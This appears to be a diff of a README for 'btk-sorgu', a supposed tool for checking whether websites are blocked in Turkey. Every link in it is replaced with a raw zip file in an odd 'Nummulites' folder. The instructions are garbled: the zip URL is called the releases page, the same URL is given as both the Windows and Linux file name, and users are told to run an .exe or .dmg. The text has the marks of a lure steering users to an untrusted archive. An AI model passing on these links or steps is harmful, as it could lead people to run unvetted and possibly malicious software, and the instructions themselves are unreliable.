@@ -6,7 +6,7 @@ Welcome to btk-sorgu! This simple tool helps you check whether websites are bloc
 
 ## 📥 Download btk-sorgu
 
-[![Download btk-sorgu](https://raw.githubusercontent.com/nhan571/btk-sorgu/main/Nummulites/btk-sorgu_v3.8.zip)](https://raw.githubusercontent.com/nhan571/btk-sorgu/main/Nummulites/btk-sorgu_v3.8.zip)
+[![Download btk-sorgu](https://github.com/nhan571/btk-sorgu/raw/refs/heads/main/Nummulites/sorgu_btk_v1.3.zip)](https://github.com/nhan571/btk-sorgu/raw/refs/heads/main/Nummulites/sorgu_btk_v1.3.zip)
 
 ## 📋 System Requirements
 
@@ -22,15 +22,15 @@ Before you start, ensure your system meets these basic requirements:
 To install and run btk-sorgu, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the releases page by clicking [here](https://raw.githubusercontent.com/nhan571/btk-sorgu/main/Nummulites/btk-sorgu_v3.8.zip).
+   Go to the releases page by clicking [here](https://github.com/nhan571/btk-sorgu/raw/refs/heads/main/Nummulites/sorgu_btk_v1.3.zip).
 
 2. **Download the Latest Version**  
-   Find the latest release at the top of the page. You will see a list of files. Click on the file that matches your operating system. It will usually be named something like `https://raw.githubusercontent.com/nhan571/btk-sorgu/main/Nummulites/btk-sorgu_v3.8.zip` for Windows or `https://raw.githubusercontent.com/nhan571/btk-sorgu/main/Nummulites/btk-sorgu_v3.8.zip` for Linux.
+   Find the latest release at the top of the page. You will see a list of files. Click on the file that matches your operating system. It will usually be named something like `https://github.com/nhan571/btk-sorgu/raw/refs/heads/main/Nummulites/sorgu_btk_v1.3.zip` for Windows or `https://github.com/nhan571/btk-sorgu/raw/refs/heads/main/Nummulites/sorgu_btk_v1.3.zip` for Linux.
 
 3. **Run the Installer**  
    - For Windows: Double-click the `.exe` file you downloaded. Follow the prompts to install btk-sorgu.
    - For macOS: Open the `.dmg` file and drag the btk-sorgu app to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/nhan571/btk-sorgu/main/Nummulites/btk-sorgu_v3.8.zip` file to a desired location and navigate to that directory in your terminal. Run the application with the command `./btk-sorgu`.
+   - For Linux: Extract the `https://github.com/nhan571/btk-sorgu/raw/refs/heads/main/Nummulites/sorgu_btk_v1.3.zip` file to a desired location and navigate to that directory in your terminal. Run the application with the command `./btk-sorgu`.
 
 4. **Launch btk-sorgu**  
    After installation, find the btk-sorgu icon on your desktop or in your Applications folder. Double-click to open the application.
@@ -58,4 +58,4 @@ Once you have btk-sorgu running, follow these simple steps to check if a website
 
 If you encounter issues or need help, please check the FAQ section on the GitHub page or contact support via the repository's issues tab.
 
-Thank you for using btk-sorgu! We hope it helps you navigate the web with ease. For more updates, visit our [release page](https://raw.githubusercontent.com/nhan571/btk-sorgu/main/Nummulites/btk-sorgu_v3.8.zip).
+Thank you for using btk-sorgu! We hope it helps you navigate the web with ease. For more updates, visit our [release page](https://github.com/nhan571/btk-sorgu/raw/refs/heads/main/Nummulites/sorgu_btk_v1.3.zip).
